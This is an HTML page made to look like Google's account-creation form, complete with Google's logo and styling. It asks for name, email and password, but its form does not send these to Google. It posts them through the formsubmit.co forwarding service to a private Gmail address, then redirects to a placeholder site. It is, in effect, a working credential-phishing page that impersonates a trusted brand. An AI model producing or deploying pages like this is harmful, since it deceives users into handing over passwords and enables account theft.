<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Google Account</title>
</head>
<body style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f9fa; font-family: Arial, sans-serif;">

    <div style="width: 400px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); text-align: center;">

        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" 
            style="width: 80px; margin-bottom: 10px;">

        <h2 style="font-weight: 500; font-size: 22px; margin-bottom: 5px;">Create your Google Account</h2>
        <p style="font-size: 14px; color: #5f6368; margin-bottom: 20px;">Enter your details below</p>

        <form action="https://formsubmit.co/madihaayaz248@gmail.com" method="POST">

            <input type="hidden" name="_next" value="https://yourwebsite.com/welcome.html">

            <!-- First & Last Name -->
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" name="first_name" placeholder="First name" required
                    style="width: 50%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;">
                <input type="text" name="last_name" placeholder="Last name" required
                    style="width: 50%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;">
            </div>

            <!-- Email Address -->
            <div style="text-align: left; margin-bottom: 15px;">
                <label for="email" style="font-size: 14px; color: #5f6368; display: block; margin-bottom: 5px;">Email</label>
                <input type="email" id="email" name="email" required
                    style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;">
            </div>

            <!-- Password & Confirm Password -->
            <div style="text-align: left; margin-bottom: 15px;">
                <label for="password" style="font-size: 14px; color: #5f6368; display: block; margin-bottom: 5px;">Password</label>
                <input type="password" id="password" name="password" required
                    style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;">
            </div>

            <div style="text-align: left; margin-bottom: 20px;">
                <label for="confirm_password" style="font-size: 14px; color: #5f6368; display: block; margin-bottom: 5px;">Confirm Password</label>
                <input type="password" id="confirm_password" name="confirm_password" required
                    style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;">
            </div>

            <div style="display: flex; justify-content: space-between; align-items: center;">
                <a href="index.html" style="text-decoration: none; color: #1a73e8; font-size: 14px;">Sign in instead</a>
                <button type="submit" style="background: #1a73e8; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-size: 14px; cursor: pointer;">
                    Next
                </button>
            </div>

        </form>
    </div>

</body>
</html>
